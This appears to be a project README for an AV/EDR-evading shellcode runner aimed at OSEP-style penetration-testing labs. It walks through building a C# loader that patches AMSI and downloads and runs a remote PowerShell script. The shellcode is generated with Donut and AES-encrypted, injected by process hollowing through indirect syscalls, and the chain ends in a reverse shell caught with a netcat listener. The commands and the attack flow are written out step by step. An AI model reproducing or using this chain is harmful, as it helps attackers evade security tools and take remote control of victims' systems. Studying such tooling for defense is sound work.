# 🧬 Stealth Shellcode Runner – AES + Donut + PowerShell Loader

## 🎯 Motivation

The main reason behind this project is the high detectability of shellcode generated with tools like `msfvenom`. Even when using encoders, these payloads are often flagged by modern antivirus and EDR solutions due to their known byte patterns and behavioral signatures.

To overcome this limitation, this project was created to:

- Replace `msfvenom` with custom shellcode generated via [Donut](https://github.com/TheWover/donut)
- Encrypt the shellcode with AES-256-CBC to obfuscate its contents
- Load and execute it using a stealthy PowerShell-based loader
- Inject and run the payload through advanced **Process Hollowing** with manually mapped **indirect syscalls**

This execution chain is designed to provide maximum stealth and flexibility, and has been successfully tested in **OSEP-style** lab environments with **Windows Defender** enabled.

---

## 🛠️ Development Environment

This project was developed and tested using:

- **Visual Studio 2022 or newer**
- **.NET Framework 4.x** (for compatibility with `System.Management.Automation`)
- **Build configuration**: `Release | x64`

📌 Make sure to open the solution with Visual Studio to:

- Compile `Loader.exe` correctly  
- Add a reference to `System.Management.Automation.dll` if needed  
- Export the binary in `Release x64` mode before generating shellcode with Donut

---

## 🔧 Techniques Used

- **Process Hollowing**
- **AES-256-CBC Encryption**
- **Donut Shellcode Generator**
- **.NET AMSI Bypass**
- **Indirect Syscalls**
- **PPID Spoofing** *(not implemented, but supported)*

Tested in OSEP-like environments with **Windows Defender enabled**.

---

## 🧩 Step 1: Build the PowerShell Loader

- The C# loader (`Loader.cs`) patches AMSI via `.NET Reflection`, downloads a remote PowerShell payload, and executes it in memory using `Runspace`.
- Uses base64 string obfuscation for script names like `shell.ps1`.

📌 **Important:**  
Make sure the hardcoded IP in `Loader.exe` **matches the IP of the machine hosting `shell.ps1`** via HTTP.

📌 **Note:** You may need to reference:
```
C:\Program Files\WindowsPowerShell\Modules\PowerShellGet\<version>\System.Management.Automation.dll
```

---

## 🧪 Step 2: Generate Shellcode with Donut

Convert the compiled `Loader.exe` into raw shellcode using [Donut](https://github.com/TheWover/donut):

```bash
donut.exe -i Loader.exe -a 2 -f 1 -b 1 -o shellcode.bin
```

**Explanation of Donut flags:**
- `-a 2`: Target architecture (x64)
- `-f 1`: Output format: raw shellcode
- `-b 1`: AMSI/WLDP/ETW bypass level  
  - `1`: **No bypass**  
  - `2`: Abort on failure  
  - `3`: Continue on failure

💡 *This project uses Donut on Windows and then transfers `shellcode.bin` to a Kali Linux host for encryption.*

---

## 🔐 Step 3: Encrypt the Shellcode with AES

Use the provided Python script to encrypt the shellcode using AES-256-CBC:

```bash
python3 Aes_encryption.py
```

- The script outputs `encryptedShellcode`, `aesKey`, and `aesIV` as C# byte arrays.
- Paste these into the `Advanced_Process_Hollowing.cs` runner.

---

## 🧠 Step 4: Execute with Process Hollowing + Indirect Syscalls

The shellcode runner performs the following:

- Creates a suspended process (e.g., `svchost.exe`)
- Allocates memory using `NtAllocateVirtualMemory` (indirect syscall)
- Decrypts the AES shellcode in memory
- Writes shellcode using `NtWriteVirtualMemory` (indirect syscall)
- Sets memory protection to `RX` using `NtProtectVirtualMemory`
- Launches a thread using `NtCreateThreadEx` (indirect syscall)

✅ All syscalls are performed using dynamically allocated stubs from `ntdll.dll`, bypassing userland API hooks from AV/EDR.

❌ **PPID Spoofing is not implemented in this version**, although the use of `STARTUPINFOEX` structure means it could be added in the future.

---

## 🌐 Step 5: Host the PowerShell Reverse Shell

Create a `shell.ps1` PowerShell script containing your reverse shell logic.

📌 **Important:**  
Ensure that the IP inside `shell.ps1` (e.g. `TCPClient('192.168.1.X', 443)`) **matches the IP of your listener machine**.

Then serve the file using Python:

```bash
python3 -m http.server 80
```

---

## 📡 Step 6: Start Listener with Netcat

Use `netcat` (and optionally `rlwrap`) to catch the reverse shell:

```bash
rlwrap -cAr nc -lnvp 443
```

---

## 🚀 Step 7: Run the Shellcode Runner

Once everything is set up, run the compiled runner:

```bash
.\Advanced_Process_Hollowing.exe
```

If successful, your listener will receive the reverse shell connection.

---

## ✅ Summary

- AMSI is patched via .NET Reflection
- AES-encrypted shellcode is decrypted and injected into a remote process
- Full execution is achieved via indirect syscalls to evade detection
- The shellcode loads a PowerShell loader that fetches and executes a remote payload
- Designed for stealth and tested in Defender-enabled environments
- PPID Spoofing is not yet implemented, but possible with minimal modification

---

## ⚠️ Legal Notice

This project is for **educational and authorized penetration testing** purposes only.  
Do not use this code outside of lab environments or without **explicit permission**.  
Misuse may be illegal and unethical.

---
